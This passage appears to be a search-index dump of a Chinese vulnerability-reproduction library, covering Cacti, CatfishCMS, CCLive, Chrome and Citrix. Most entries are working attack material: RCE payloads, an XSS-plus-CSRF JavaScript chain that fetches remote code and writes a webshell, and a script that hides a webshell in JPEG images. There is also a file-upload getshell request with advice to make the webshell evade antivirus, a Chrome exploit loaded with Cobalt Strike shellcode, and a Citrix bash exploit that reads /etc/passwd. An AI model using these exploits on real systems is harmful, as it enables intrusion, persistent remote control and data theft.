nc ;)\") requests.get(path, cookies=cookies) else: print(\"[+] Error while requesting the file!\") send_exploit(url) image 如我们所见，如果启用了\" Gest Realtime Graphs\"特权，我们也可以毫无问题地利用它，因此最好检查\" graph_realtime.php\"文件是否具有此访问特权。 参考链接 https://shells.systems/cacti-v1-2-8-authenticated-remote-code-execution-cve-2020-8813/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:59 "},"Web安全/CatfishCMS/（CNVD-2019-06255）CatfishCMS远程命令执行/（CNVD-2019-06255）CatfishCMS远程命令执行.html":{"url":"Web安全/CatfishCMS/（CNVD-2019-06255）CatfishCMS远程命令执行/（CNVD-2019-06255）CatfishCMS远程命令执行.html","title":"（CNVD-2019-06255）CatfishCMS远程命令执行","keywords":"","body":"（CNVD-2019-06255）CatfishCMS远程命令执行 一、漏洞简介 二、漏洞影响 v4.8.54 三、复现过程 1、_method=__construct CatfishCMS基于thinkPHP5开发。Request类（catfish/library/think/Request.php）用于处理请求。它的成员函数method用于获取请求的类型。 CatfishCMS远程命令执行/media/rId25.png) application/config.php 中定义了\"表单请求类型伪装变量\": CatfishCMS远程命令执行/media/rId26.png) POST请求参数 \" _method=__construct \"，将 __construct 传给了var_method ，在Request类的method函数中执行后，实现了对Request类的 __construct 构造函数的调用；并且将完整的POST参数传给了构造函数。 2、method=*&filter[]=system catfish/library/think/Request.php模块中的Request类的构造函数： CatfishCMS远程命令执行/media/rId28.png) 中存在的参数，就取用户传入的值为其赋值。 _method=__construct 使得 method 函数调用了 __construct 构造函数， 并且将完整的POST参数传递过去。实现了对本类中的 $method 和 $filter 两个全局变量的覆盖。 CatfishCMS远程命令执行/media/rId29.png) CatfishCMS远程命令执行/media/rId30.png) filter[]=system 的补充说明：filter[]=system 或者 filter=system都可以，[]符号可有可无；system意为执行系统命令。 Method=* 的补充说明： method参数的取值限定为：catfish/library/think/Route.php 模块中定义的路由规则。如：GET、POST、PUT、* 等任何一个值都可以；如果值不在此表或为空，都会报错。 CatfishCMS远程命令执行/media/rId31.png) 3、s=dir application/config.php 中定义PATHINFO变量名为' s '。可用s传入需要执行的命令，如s=dir 最终的的payload： s=dir&_method=__construct&method=*&filter[]=system _method=__construct 使得 Request类的method函数调用 __construct 构造函数，并且将完整的payload传递给构造函数；构造函数中对 method 和filter 两个全局变量进行覆盖，method=&filter[]=system ；参数s=dir传入需要执行的系统命令 dir 。 s=echo \"shell\" >shell.php&filter[]=system&method=*&_method=__construct Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:18 "},"Web安全/CatfishCMS/CatfishCMS 4.5.7 csrf getshell/CatfishCMS 4.5.7 csrf getshell.html":{"url":"Web安全/CatfishCMS/CatfishCMS 4.5.7 csrf getshell/CatfishCMS 4.5.7 csrf getshell.html","title":"CatfishCMS 4.5.7 csrf getshell","keywords":"","body":"CatfishCMS 4.5.7 csrf getshell 一、漏洞简介 二、漏洞影响 CatfishCMS 4.5 三、复现过程 思路： 前台评论出插入xss代码->诱骗后台管理员访问网站-内容管理-评论管理-自动执行xss代码->通过csrf插入一条新文章->通过csrf清除缓存->在通过js访问前端任意页面生成缓存建立shell大概的想法就是这样做了。 后台创建文章方法 地址：application\\admin\\controller\\Index.php 方法：write(); 这个方法没有什么可以讲的只是后面的组合漏洞要使用到他 后台清除缓存方法 地址：application\\admin\\controller\\Index.php 方法：clearcache() 这个方法没有什么可以讲的只是后面的组合漏洞要使用到他 例子： 1， 准备好脚本 2，利用前面的xss漏洞，配合这个脚本形成xsrf漏洞 这样我们在前端的事情就完事了。接着我们模拟后台管理员进入后台的操作 模拟的后端管理员操作： 漏洞原理与流程： 1,后台创建文章方法地址：application\\admin\\controller\\Index.php方法：write();这个方法没有什么可以讲只是单纯的从前端获取数据然后写入数据库罢了 2,后台清除缓存方法地址：application\\admin\\controller\\Index.php方法：clearcache()这个方法没有什么可以讲的。只是单纯的删除缓存数据 3,访问前端重新生成缓存地址： application\\index\\controller\\Index.php方法：index() 缓存的名字由来缓存的名字组成就是比较简单的了。 这上面几幅图就是缓存的名字了什么意思呢？很简单 首先是从index目录里面的index模块下面的index方法调用了一个方法$template= $this->receive(\\'index\\'); = index 然后是ndex目录里面的Common模块里面的receive 方法获取了变量$source 值 = index获取了变量$page 值 = 1 Cache::set(\\'hunhe_\\'.$source.$page,$hunhe,3600); 缓存方法最后就是 MD5(hunhe_index1) = 9040ab6906a15768edcd9e5b1d57fcda 后记： 使用此方法的话，尝试一下在url中输入 http://www.xxxxxxx.com/runtime http://www.xxxxxxx.com/runtime/cache http://www.xxxxxxx.com/runtime/cache/8d6ab84ca2af9fccd4e4048694176ebf.php 按顺序输入如果前两个访问得到的结果是403 最后的结果不是403或是404 而是返回正常的页面，那么说明站点的缓存目录是可以访问的，这个时候可以使用此漏洞。配合xss+csrf 获取getshell Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:02 "},"Web安全/CatfishCMS/CatfishCMS 4.5.7 xss/CatfishCMS 4.5.7 xss.html":{"url":"Web安全/CatfishCMS/CatfishCMS 4.5.7 xss/CatfishCMS 4.5.7 xss.html","title":"CatfishCMS 4.5.7 xss","keywords":"","body":"CatfishCMS 4.5.7 xss 一、漏洞简介 二、漏洞影响 CatfishCMS 4.5 三、复现过程 漏洞分析 文件：application\\config.php 参数：default_filter 最后找到一处未过滤的地方 文件：application/index/controller/Index.php 方法：pinglun() 过滤函数 文件：application\\index\\controller\\Common.php 方法：filterJs() 可以看到只是简单的过滤 很简单就可以绕过\\ \\复现\\ \\自己在此cms注册一个账号然后随便点击一篇文章\\ \\\\\\ \\\\\\ \\\\\\ \\\\\\ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:06 "},"Web安全/CatfishCMS/CatfishCMS 4.6.15 csrf getshell/CatfishCMS 4.6.15 csrf getshell.html":{"url":"Web安全/CatfishCMS/CatfishCMS 4.6.15 csrf getshell/CatfishCMS 4.6.15 csrf getshell.html","title":"CatfishCMS 4.6.15 csrf getshell","keywords":"","body":"CatfishCMS 4.6.15 csrf getshell 一、漏洞简介 在测试的过程中发现更新版本的时候作者添加一个参数 verification 可能是用来防治csrf。嗯，不得不说，作者安全意识提高了，用来防治csrf这的却是一个好思路，但是对于我们可以执行xss来说，verification 就显的苍白无力了，因为我们可以先获取verification 然后在执行csrf 从而来绕过。 二、漏洞影响 CatfishCMS 4.6 三、复现过程 漏洞分析 文件：CatfishCMS-4.6.12\\catfish\\library\\think\\Template.php 函数：fetch() 嗯，说完了。Fetch方法最后都会编译文件以后通过PHP输出，所以如果我们可以在他编译之前写入恶意代码 那么就可以为所欲为。 复现 前台注册一个账户->注册一个图片马到网站中->评论处插入xss代码->等待无辜管理员登录网站->获取 verification(绕过检测)->管理员入口-页面管理-新建页面-csrf插入一条非法语句引起包含漏洞(用来包含前面的图片马)->包含漏洞执行代码->包含漏洞添加getshell_code.php文件写入恶意代码->包含漏洞-将框架文件start.php添加一句话木马-包含数据库配置文件-连接数据库->删除我们前面的评论->删除我们csrf创建的页面->邮件通知我们->getshell CatfishCMS-4.6.12-xss.js /* 需要插入的xss代码 ';$('body').append(xss_js);\"> */ //不用动的 var articles = 'index.php/admin/Index/articles.html';//用来获取 verification 绕过检测 var newpage = 'index.php/admin/Index/newpage.html';//生成文章地址 var allpage = 'index.php/admin/Index/allpage.html';//获取文章链接 //需要改的 var url = 'http://0-sec.org';//你要日的站的域名 var directory = '/cms/CatfishCMS-4.6.12/'; //日的站的额外目录一般为空即可(站点设置二级目录时，此目录要填写) var img_trojan_url = '../../../'+'data/uploads/20171201/2c8b7c7f1d49faeb5321ce0c9b1962af.jpg';//图片马的地址 修改 + 号后面的即可 var getshell_code = 'http://127.0.0.1/cms/CatfishCMS-4.6.12/xss-js/getshell_code.txt';//恶意代码远程包含的地址 $('body').append(''); $('body').append(''); $.ajax({ url: url+directory+articles, dataType: \"json\", success: function(verification_content){ $('#csrf_verification').append(verification_content); var verification = $('#verification').html();//用来绕过验证的 // alert(verification); //csrf生成文章,引起文件包含漏洞 $.ajax({ type: \"POST\", url: url+directory+newpage, data: { 'biaoti':'xss_csrf_getshll', 'template':img_trojan_url, 'verification':verification, 'fabushijian':'2017-12-05 11:56:48' }, success: function(){ //csrf获取shell链接 $.ajax({ type: \"POST\", url: url+directory+allpage, success: function(allpage_content){ $('#csrf_allpage').append(allpage_content); var shell_id = $('#csrf_allpage .table-responsive .table-bordered tbody tr td .gouxuan').eq(0).val(); var shell_url = $('#csrf_allpage .table-responsive .table-bordered tbody tr td a').eq(0).attr('href'); var shell_content = ''; shell_content+= \"$myfile = fopen('getshell_code.php', 'w');\"; shell_content+= '$txt = '+'file_get_contents(\"'+getshell_code+'\");'; shell_content+= 'fwrite($myfile, $txt);'; console.log(shell_content); //执行shell 生成马子 $.ajax({ type: \"POST\", url: url+shell_url, dataType: \"json\", data: {'ddd':shell_content}, success: function(data){ $.ajax({ type: \"GET\", url: url+directory+'getshell_code.php', dataType: \"json\", // data: {'zzz':1} }); }, error: function(){ $.ajax({ type: \"GET\", url: url+directory+'getshell_code.php', dataType: \"json\", // data: {'zzz':1} }); } }); } }); } }); } }); 写好以后模拟管理员，进入后台 getshell_code query($sql); $pdo->query($sql_1); unlink('getshell_code.php'); } ?> 连接马子的操作，这个文件会在index.php中给引入所以直接 http://0-sec.org/index.php POST ddd = 你要执行的命令 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:07 "},"Web安全/CatfishCMS/CatfishCMS 4.6.15 前台xss/CatfishCMS 4.6.15 前台xss.html":{"url":"Web安全/CatfishCMS/CatfishCMS 4.6.15 前台xss/CatfishCMS 4.6.15 前台xss.html","title":"CatfishCMS 4.6.15 前台xss","keywords":"","body":"CatfishCMS 4.6.15 前台xss 一、漏洞简介 二、漏洞影响 CatfishCMS 4.6 三、复现过程 代码分析 url： http://0-sec.org/cms/CatfishCMS-4.6.12/index.php/index/Index/pinglun 文件：application/index/controller/Index.php 方法：pinglun( 文件：application\\index\\controller\\Common.php 过滤函数：filterJs() 漏洞复现 首先注册一个用户 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:11 "},"Web安全/CatfishCMS/CatfishCMS 4.6.15 后台文件包含getshell/CatfishCMS 4.6.15 后台文件包含getshell.html":{"url":"Web安全/CatfishCMS/CatfishCMS 4.6.15 后台文件包含getshell/CatfishCMS 4.6.15 后台文件包含getshell.html","title":"CatfishCMS 4.6.15 后台文件包含getshell","keywords":"","body":"CatfishCMS 4.6.15 后台文件包含getshell 一、漏洞简介 使用TP的模版函数进行文件包含 二、漏洞影响 CatfishCMS 4.6 三、复现过程 漏洞原理 url： http://0-sec.org/cms/CatfishCMS-4.6.12/index.php/admin/Index/newpage.html 文件地址：\\CatfishCMS-4.6.12\\application\\admin\\controller\\Index.php 函数：newpage() 复现 首先需要制作图片马 在正常图片中插入shell并无视GD图像库的处理，常规方法有两种 1. 对比两张经过php-gd库转换过的gif图片，如果其中存在相同之处，这就证明这部分图片数据不会经过转换。然后我可以注入代码到这部分图片文件中，最终实现远程代码执行 2. 利用php-gd算法上的问题进行绕过 这里我们选择第二种，使用脚本进行处理图片并绕过 1. 上传一张jpg图片，然后把网站处理完的图片再下回来 比如x.jpg 2. 执行图片处理脚本脚本进行处理 php jpg_payload.php x.jpg 3. 如果没出错的话，新生成的文件再次经过gd库处理后，仍然能保留webshell代码语句 提示： 1. 图片找的稍微大一点 成功率更高 2. shell语句越短成功率越高 3. 一张图片不行就换一张 不要死磕注：上面的字全部是抄的，先说明一下不然给人按在地上骂就不好了 制作过程： 图片马制作脚本 In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $a = '$_POST[eeeeeee]'; $miniPayload = \"\"; /*$miniPayload = \"\";*/ if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) { die('php-gd is not installed'); } if(!isset($argv[1])) { die('php jpg_payload.php '); } set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad readShort() != 0xFFD8) { die('Incorrect SOI marker'); } while((!$dis->eof()) && ($dis->readByte() == 0xFF)) { $marker = $dis->readByte(); $size = $dis->readShort() - 2; $dis->skip($size); if($marker === 0xDA) { $startPos = $dis->seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis->eof())) { if($dis->readByte() === 0xFF) { if($dis->readByte !== 0x00) { break; } } } $stopPos = $dis->seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage('payload_'.$argv[1], $outStream)) { die('Success!'); } else { break; } } } } unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this->binData = ''; $this->order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this->binData = file_get_contents($filename); } else { $this->binData = $filename; } $this->size = strlen($this->binData); } public function seek() { return ($this->size - strlen($this->binData)); } public function skip($skip) { $this->binData = substr($this->binData, $skip); } public function readByte() { if($this->eof()) { die('End Of File'); } $byte = substr($this->binData, 0, 1); $this->binData = substr($this->binData, 1); return ord($byte); } public function readShort() { if(strlen($this->binData) binData, 0, 2); $this->binData = substr($this->binData, 2); if($this->order) { $short = (ord($short[1]) binData||(strlen($this->binData) === 0); } } ?> Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:13 "},"Web安全/CatfishCMS/CatfishCMS后台csrf/CatfishCMS后台csrf.html":{"url":"Web安全/CatfishCMS/CatfishCMS后台csrf/CatfishCMS后台csrf.html","title":"CatfishCMS后台csrf","keywords":"","body":"CatfishCMS后台csrf 一、漏洞简介 二、漏洞影响 三、复现过程 首先需要登录后台 history.pushState('', '', '/') 修改前 修改后 image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:17 "},"Web安全/CatfishCMS/CatfishCMS后台储存型xss/CatfishCMS后台储存型xss.html":{"url":"Web安全/CatfishCMS/CatfishCMS后台储存型xss/CatfishCMS后台储存型xss.html","title":"CatfishCMS后台储存型xss","keywords":"","body":"CatfishCMS后台储存型xss 一、漏洞简介 网站背景中的管理员可以发布包含存储XSS漏洞的文章 提交标题以抓取数据包 使用burp修改参数 浏览文章可以触发XSS 二、漏洞影响 三、复现过程 neiron= Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:18 "},"Web安全/CCLive在线客服系统/CCLive在线客服存在任意文件上传/CCLive在线客服存在任意文件上传.html":{"url":"Web安全/CCLive在线客服系统/CCLive在线客服存在任意文件上传/CCLive在线客服存在任意文件上传.html","title":"CCLive在线客服存在任意文件上传","keywords":"","body":"CCLive在线客服存在任意文件上传 漏洞描述 CCLive在线客服系统存在任意文件上传，可通过上传图片马进行getshell 漏洞影响 CCLive在线客服系统 FOFA title=\"CCLive在线客服系统\" 漏洞复现 登录界面如下： 然后直接访问URL进入在线客服页面，然后从图片上传处进行抓包 /index/index/home?visiter_id=&visiter_name=&avatar=&business_id=1&groupid=0&special=1 将png后缀修改为php,以这样的方式来绕过前端验证。 POST /admin/event/uploadimg HTTP/1.1 Host: url Cookie: PHPSESSID=utrvj3a4vmncvmiaknccmt17nr Content-Length: 721 Accept: application/json, text/javascript, */*; q=0.01 Origin: url X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWvBQTUlpjNAdVfUt Referer: url/index/index?code=v9zzfNPShXGiImqm%2BjTb52DPR%2B%2BcnjEIFN4Q%2BfnbLgkNxmOgGDfmOzNSL49%2B0SCZHhjvyJZc%2BNPFyOv33HNisSF5hkaZW0w4QFZkqCzXmWx9Bi0GXxAdBo0MVIuqTye2XlFYUQ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.8 Connection: close ------WebKitFormBoundaryWvBQTUlpjNAdVfUt Content-Disposition: form-data; name=\"editormd-image-file\"; filename=\"1.jpg.php\" Content-Type: image/png text ------WebKitFormBoundaryWvBQTUlpjNAdVfUt Content-Disposition: form-data; name=\"visiter_id\" YKs5EmtR ------WebKitFormBoundaryWvBQTUlpjNAdVfUt Content-Disposition: form-data; name=\"business_id\" zzcc520 ------WebKitFormBoundaryWvBQTUlpjNAdVfUt Content-Disposition: form-data; name=\"avatar\" /assets/images/index/avatar-red2.png ------WebKitFormBoundaryWvBQTUlpjNAdVfUt Content-Disposition: form-data; name=\"record\" ------WebKitFormBoundaryWvBQTUlpjNAdVfUt Content-Disposition: form-data; name=\"service_id\" 13 ------WebKitFormBoundaryWvBQTUlpjNAdVfUt-- 从网页端来访问下看看是否可以访问到 最后，马子记得免杀。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:20 "},"Web安全/Chrome/chrome利用详情/chrome利用详情.html":{"url":"Web安全/Chrome/chrome利用详情/chrome利用详情.html","title":"chrome利用详情","keywords":"","body":"1、使用以下脚本，保存为chrome.html格式 ``` function gc() { for (var i = 0; i 2、打开cobaltstrike，设置一个监听http或https的都可以https的相对稳定，这里使用http 3、使用cs生成payload，监听器选择上一步生成的，输出选择C，然后勾选上X64 payload。 4、打开生成的payload取出 shellcode 部分 使用全局替换功能将“\\”为改为 “,0”。 5、将替换好的shellcode拿出来放入到chrome.html中的shellcode中 6、在桌面Google快捷方式中右键属性在“目标”处加上--no-sandbox参数关闭沙箱 7、在chrome中打开，chrome.html文件，可以看到cs成功上线。 8、临时修复方案： ①、建议不要点击别人发送的快捷方式 ②、不要关闭chrome沙箱1、使用以下脚本，保存为chrome.html格式 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:23 "},"Web安全/Chrome/Windows Chrome 远程命令执行漏洞/Windows Chrome 远程命令执行漏洞.html":{"url":"Web安全/Chrome/Windows Chrome 远程命令执行漏洞/Windows Chrome 远程命令执行漏洞.html","title":"Windows Chrome 远程命令执行漏洞","keywords":"","body":"Chrom 远程命令执行漏洞 漏洞描述 Windows Chrome 0day 在 2021-4-13 被公开 漏洞影响 [!NOTE] Window Chrome 浏览器 漏洞复现 Github： https://github.com/r4j0x00/exploits/tree/master/chrome-0day 推特: https://twitter.com/r4j0x00/status/1381643526010597380?s=12 exp.html exp.js /* /* BSD 2-Clause License Copyright (c) 2021, rajvardhan agarwal All rights reserved. Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */ var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]) var wasm_mod = new WebAssembly.Module(wasm_code); var wasm_instance = new WebAssembly.Instance(wasm_mod); var f = wasm_instance.exports.main; var buf = new ArrayBuffer(8); var f64_buf = new Float64Array(buf); var u64_buf = new Uint32Array(buf); let buf2 = new ArrayBuffer(0x150); function ftoi(val) { f64_buf[0] = val; return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) > 32n); return f64_buf[0]; } const _arr = new Uint32Array([2**31]); function foo(a) { var x = 1; x = (_arr[0] ^ 0) + 1; x = Math.abs(x); x -= 2147483647; x = Math.max(x, 0); x -= 1; if(x==-1) x = 0; var arr = new Array(x); arr.shift(); var cor = [1.1, 1.2, 1.3]; return [arr, cor]; } for(var i=0;i Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:23 "},"Web安全/Citrix/（CVE-2019-19781）Citrix 远程命令执行漏洞/（CVE-2019-19781）Citrix 远程命令执行漏洞.html":{"url":"Web安全/Citrix/（CVE-2019-19781）Citrix 远程命令执行漏洞/（CVE-2019-19781）Citrix 远程命令执行漏洞.html","title":"（CVE-2019-19781）Citrix 远程命令执行漏洞","keywords":"","body":"（CVE-2019-19781）Citrix 远程命令执行漏洞 一、漏洞简介 二、漏洞影响 13.x,12.1,12.0,11.1,10.5 三、复现过程 bash CVE-2019-19781.sh www.0-sec.org 'cat /etc/passwd' 1.png CVE-2019-19781.sh #!/bin/bash # Remote Code Execution Exploit for Citrix Application Delivery Controller and Citrix Gateway - CVE-2019-19781 # Usage : bash CVE-2019-19781.sh IP_OF_VULNURABLE_HOST COMMAND_TO_EXECUTE e.g : bash CVE-2019-19781.sh XX.XX.XX.XX 'uname -a' # Release Date : 11/01/2020 # Follow Us : https://twitter.com/ProjectZeroIN / https://github.com/projectzeroindia echo \"================================================================================= ___ _ _ ____ ___ _ _ | _ \\ _ _ ___ (_) ___ __ | |_ |_ / ___ _ _ ___ |_ _| _ _ __| |(_) __ _ | _/| '_|/ _ \\ | |/ -_)/ _|| _| / / / -_)| '_|/ _ \\ | | | ' \\ / _' || |/ _' | |_| |_| \\___/_/ |\\___|\\__| \\__| /___|\\___||_| \\___/ |___||_||_|\\__,_||_|\\__,_| |__/ CVE-2019-19781 =================================================================================\" ############################## if [ -z \"$1\" ]; then echo -ne 'Usage : bash CVE-2019-19781.sh IP_OF_VULNURABLE_HOST COMMAND_TO_EXECUTE\\n' exit; fi export LC_CTYPE=C filenameid=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1); curl -s -k \"https://$1/vpn/../vpns/portal/scripts/newbm.pl\" -d \"url=http://example.com\\&title=[%25+template.new({'BLOCK'%3d'exec(\\'$2 | tee /netscaler/portal/templates/$filenameid.xml\\')%3b'})+%25]\\&desc=test\\&UI_inuse=RfWeb\" -H \"NSC_USER: /../../../../../../../../../../netscaler/portal/templates/$filenameid\" -H 'NSC_NONCE: test1337' -H 'Content-type: application/x-www-form-urlencoded' --path-as-is echo -ne \"\\n\" ;curl -m 3 -k \"https://$1/vpn/../vpns/portal/$filenameid.xml\" -s -H \"NSC_NONCE: pwnpzi1337\" -H \"NSC_USER: pwnpzi1337\" --path-as-is echo -ne \"Command Output :\\n\" curl -m 3 -k \"https://$1/vpn/../vpns/portal/$filenameid.xml\" -H \"NSC_NONCE: pwnpzi1337\" -H \"NSC_USER: pwnpzi1337\" --path-as-is © 2020 GitHub, Inc. Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:24 "},"Web安全/Citrix/（CVE-2020-7473）Citrix 认证绕过getshell/（CVE-2020-7473）Citrix 认证绕过getshell.html":{"url":"Web安全/Citrix/（CVE-2020-7473）Citrix 认证绕过getshell/（CVE-2020-7473）Citrix 认证绕过getshell.html","title":"（CVE-2020-7473）Citrix 认证绕过getshell","keywords":"","body":"（CVE-2020-7473）Citrix 认证绕过getshell 一、漏洞简介 二、漏洞影响 ShareFile storage zones Controller 5.9.0 ShareFile storage zones Controller 5.8.0 ShareFile storage zones Controller 5.7.0 ShareFile StorageZones Controller 5.6.0 ShareFile StorageZones Controller 5.5.0 及ShareFile StorageZones Controller更早版本 三、复现过程 0x01 CreateSession request POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: www.0-sec.org:9080 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36 C845D9D38B3A68F4F74057DB542AD252 tx/2.0 Content-Length: 44 Accept-Encoding: gzip, deflate Connection: close Content-Type: application/xml Range: bytes=0-102400 X-Nitro-Pass: jr9bt X-Nitro-User: boej3 response HTTP/1.1 406 Not Acceptable Date: Sun, 12 Jul 2020 07:52:00 GMT Server: Apache/2.4.34 (Unix) Set-Cookie: SESSID=eb1780b044676f588dbcc2a6305f6b57; path=/; HttpOnly Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Content-Length: 4489 Connection: close Content-Type: application/xml; charset=utf-8 An internal server error was encounteredAn internal server error was encounteredAn internal server error was encounteredAn internal server error was encounteredAn internal server error was encounteredAn internal server error was encounteredAn internal server error was encounteredAn internal server error was encounteredAn internal server error was encounteredAn internal server error was encountered -1MISMATCH_OBJECTNAME_ERRORERROR An internal server error was encounteredAn internal server error was encountered -1MISMATCH_OBJECTNAME_ERRORERROR An internal server error was encounteredAn internal server error was encountered -1MISMATCH_OBJECTNAME_ERRORERROR An internal server error was encounteredAn internal server error was encountered -1MISMATCH_OBJECTNAME_ERRORERROR An internal server error was encounteredAn internal server error was encountered -1MISMATCH_OBJECTNAME_ERRORERROR 0x02 fix session request GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1 Host: www.0-sec.org:9080 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36 C845D9D38B3A68F4F74057DB542AD252 tx/2.0 Accept-Encoding: gzip, deflate Connection: close Cookie: SESSID=eb1780b044676f588dbcc2a6305f6b57 Range: bytes=0-102400 response HTTP/1.1 302 Found Date: Sun, 12 Jul 2020 07:54:31 GMT Server: Apache/2.4.34 (Unix) Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Set-Cookie: is_cisco_platform=-1; expires=Wed, 07-Jul-2021 07:54:32 GMT; Max-Age=31104000; path=/; HttpOnly Location: /menu/neo Content-Length: 416 Connection: close Content-Type: text/html; charset=UTF-8 An internal server error was encounteredAn internal server error was encountered 0x03 Get rand_key request GET /menu/stc HTTP/1.1 Host: www.0-sec.org:9080 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36 C845D9D38B3A68F4F74057DB542AD252 tx/2.0 Accept-Encoding: gzip, deflate Connection: close Cookie: SESSID=eb1780b044676f588dbcc2a6305f6b57; is_cisco_platform=-1 Range: bytes=0-102400 response HTTP/1.1 206 Partial Content Date: Sun, 12 Jul 2020 07:54:35 GMT Server: Apache/2.4.34 (Unix) Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Vary: Accept-Encoding Content-Range: bytes 0-4149/4150 Content-Length: 15501 Connection: close Content-Type: text/html; charset=UTF-8 Citrix ADC - Statistics //rand is used in utils.js in the URL to logout and in the URL to update NSAPI token //rand_key & rand are used in utils.js to avoid CSRF in all POST requests var rand = \"181103693.1594540472072128\"; var rand_key = \"14247218531594540472072170\"; var NSERR_SESSION_EXPIRED = 444; ... Error retrieving data.return code = 354.Error message = Invalid username or password. note: var rand = \\\"181103693.1594540472072128\\\"; 0x04 re-break Session request POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: www.0-sec.org:9080 User-Agent: python-requests/2.20.0 Content-Length: 44 Accept-Encoding: gzip, deflate Connection: close Content-Type: application/xml Cookie: SESSID=eb1780b044676f588dbcc2a6305f6b57; is_cisco_platform=-1 Range: bytes=0-102400 X-NITRO-USER: mMg96GTR X-NITRO-PASS: QXom91tz response HTTP/1.1 406 Not Acceptable Date: 